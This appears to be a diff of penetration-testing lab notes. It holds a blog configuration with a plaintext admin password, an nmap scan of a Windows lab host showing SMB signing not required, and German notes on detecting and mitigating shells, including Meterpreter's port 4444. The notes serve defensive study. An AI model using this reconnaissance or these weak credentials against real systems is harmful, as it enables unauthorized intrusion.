+pic_big = static/images/port.jpg
+cover = static/images/cover.jpg
+
+[language]
+lang = en
+
+[components]
+highlight = true
+
+[custom]
+theme = theme02
+;header = data/header.html
+;styles[] = static/styles/custom1.css
+;styles[] = static/styles/custom2.css
+;scripts = static/styles/scripts.css
+
+[bbcode]
+;bbtags[quote] = "<quote>{param}</quote>"
+
+[admin]
+force_login = true
+nick = admin
+pass = 'admin123!@#'
+
+[friends]
+;friends[user] = pass
+;friends[user] = pass
+
+[directories]
+images_path = data/i/
+thumbnails_path = data/t/
+logs_path = data/logs/
+
+[proxy]
+;proxy = hostname:port
+;proxyauth = username:password
+;proxytype = CURLPROXY_HTTP ; default, if not set
+;proxytype = CURLPROXY_SOCKS4
+;proxytype = CURLPROXY_SOCKS5
+
+;URL_PREFIX type:
+;proxy = http://your.page.com/proxy.cgi?
+;proxyauth = username:password
+;proxytype = URL_PREFIX
+
+[system]
+timezone = America/New_York
+system_name = blog.inlanefreight
+version = 1.3
+debug = true
+logs = false
+
+
+
+Host 3:
+- 172.16.1.13
+nmap -sV -sC 172.16.1.13
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-11 16:15 EST
+Nmap scan report for 172.16.1.13
+Host is up (0.064s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: 172.16.1.13 - /
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 2h40m00s, deviation: 4h37m07s, median: 0s
+|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ec:cb (VMware)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-03-11T21:15:39
+|_  start_date: 2023-03-11T21:13:50
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: SHELLS-WINBLUE
+|   NetBIOS computer name: SHELLS-WINBLUE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-03-11T13:15:39-08:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.73 seconds
+
+###################################################################################################
+Additional Considerations
+1. Detection & Prevention:
+- Monitoring:
+	- Wir haben zur Bereitstellung von Shells viele Moeglichkeiten
+	- Das MITRE ATT&CK Framework befast sich mit Techniken und Taktiken, die von Angreifern eingesetzt werden koennte
+	- ATT&CK Framework:
+		- Ist ein Framework fuer eine Wissensbasis ueber die Taktiken und Techniken der Angreifer, die auf realen Beobachtungen beruht
+		- Folgende Techniken und Taktiken sind bemerkenswert:
+			- Initial Access:
+				- Angreifer versuchen ueber oeffentliche Hosts oder Dienste wie Webanwendungen oder SMB Zugang zu erhalten
+				- Weiter Informationen unter https://owasp.org/www-project-top-ten/
+			- Execution:
+				- Die Technik haengt von Code ab der der Angreifer bereitstellt
+				- Es gibt viele Moeglichkeiten eine Shell zu bekommen
+			- Command & Control:
+				- Wir haben einen Mechanismus indem wir Code auf einem Host ausfuehren koennen
+				- Dieser kann HTTP/S Befehle oder DNS/NTP ausfuehren 
+
+- Events To Watch For:
+	- File Uploads:
+		- Besonders in Webanwendungen sind File Uploads ein gaengiges Einfallstor um eine Shell zu erlangen
+	- Suspicious non-admin user actions:
+		- Nach verschiedenen Befehle Ausschau halten wie dem Befehl whoami
+		- Mit einem Share oder von einem zum anderen Host mit SMB zu verbinden ist verdaechtig
+		- SMB und Shares sind meistens von end host zu Infrastruktur Server und nicht host zu host
+	- Anomalous network sessions:
+		- Nach Ports Ausschau halten die von verschiedenen Tools wie Meterpreter(4444) verwendet werden. Ob eine Menge von GET/POST Anfragen in kurzer Zeit aufkommen
+
+- Establish Network Visibility:
+	- Eine Erkennung von Nutzlasten ist eine gute Moeglichkeit um ein Verstaendnis vom System zu bekommen
+	- Die Dokumentation ist eine guter Schritt um einen Ueberblick ueber Systeme zu bekommen
+	- Die Entwicklugn fuer Netzwerkflussdiagramme zu visualisieren kann gut fuer das Verstaendnis sein
+	- Tools um den Netzwerk Traffic zu ueberwachen ist netbrain
+	- Fuer manche Netzwerkgeraete wird die Verwaltungsfunktion ueber einen Cloud Controller geregelt. Auf dem sich der Admin sich einloggen muss, und auf dem man dann ein Ueberblick ueber den Datenverkehrt hat
+	- Wenn die Grunddaten Ihres Netzwerk kennen und verstehen ist es leicht die Abweichungen zu sehen
+	- Wenn die Kommunikation fuer ReverseShell oder BindShell unverschluesselt ist kann mit einer Deep Packet Inspection die Payload erkannt werden
+
+- Protecting End Devices:
+	- End Geraete sind mit dem "Ende" eines Netzwerks verbunden, dass heisst die Geraete sind Start oder Ende einer Datenuebertragung. Manche Geraete sind:
+		- Workstation(Employees Computer)
+		- Server
+		- Printers
+		- Network Attached Storage
+		- Cameras
+		- Smart TVs
+		- Smart Speaker
+		- usw
+	- Diese Geraete sollten stark ueberwacht werden
+	- Ein Anti Virus Programm kann bei Angriffen helfen
+
+- Potential Mitigations:
+	- Folgende Implementierungen koennen die Exploits entschaerfen:
+		- Application Sandboxing:
+			- Die Anwendungen die in der oeffentlich zugaenglich sind in eine Sandbox zu packen
+		- Least Privilege Permission Policies:
+			- Die Userrechte einzuschraenken und unbefugten Zugriff zu verhindern
+			- Ein User sollte immer die niedrigsten Rechte haben
+		- Host Segmentation & Hardening:
+			- Die ordentliche Absicherung von Hosts und die Abtrennung von Hosts
+			- VPN Servern oder DNS Server in eine Quarantaene zu stecken
+		- Physical and Application Layer Firewalls:
+			- Firewalls koennen maechtige Werkzeuge sein
+			- Bind- und Reverseshells konenn mit einer Firewall verhindert werden
+			- 
+			- 
+
+
+
